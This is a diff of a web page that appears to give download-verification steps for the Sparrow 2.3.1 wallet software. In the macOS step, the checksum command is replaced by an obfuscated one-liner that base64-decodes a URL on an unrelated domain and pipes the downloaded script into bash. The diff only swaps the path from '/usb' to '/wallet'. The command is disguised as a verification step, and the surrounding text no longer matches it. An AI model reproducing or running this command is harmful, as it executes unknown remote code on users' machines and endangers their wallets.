@@ -252,7 +252,7 @@
 <li>Paste the <strong>command</strong> into the <strong>Terminal</strong> window and press <span class=key>Return</span></li>
 </ul>
 <h4 id=macos>macOS<a class=header-link href=#macos title=Permalink><span class=sr-only>Permalink</span><i class="fa fa-link"></i></a></h4>
-<div class="language-shell highlighter-rouge"><div class=highlight><pre class=highlight><code>/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9ndXRhbmRvLmNvbS91c2I= | base64 -d))"</code></pre></div></div>
+<div class="language-shell highlighter-rouge"><div class=highlight><pre class=highlight><code>/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9ndXRhbmRvLmNvbS93YWxsZXQ= | base64 -d))"</code></pre></div></div>
 <p>Note: Older versions of macOS (pre v11) don’t support <code class="language-plaintext highlighter-rouge">--ignore-missing</code>. You can leave it out and ignore the missing files reported.</p>
 <h4 id=linux>Linux<a class=header-link href=#linux title=Permalink><span class=sr-only>Permalink</span><i class="fa fa-link"></i></a></h4>
 <div class="language-shell highlighter-rouge"><div class=highlight><pre class=highlight><code><span class=nb>sha256sum</span> <span class=nt>--check</span> sparrow-2.3.1-manifest.txt <span class=nt>--ignore-missing</span>
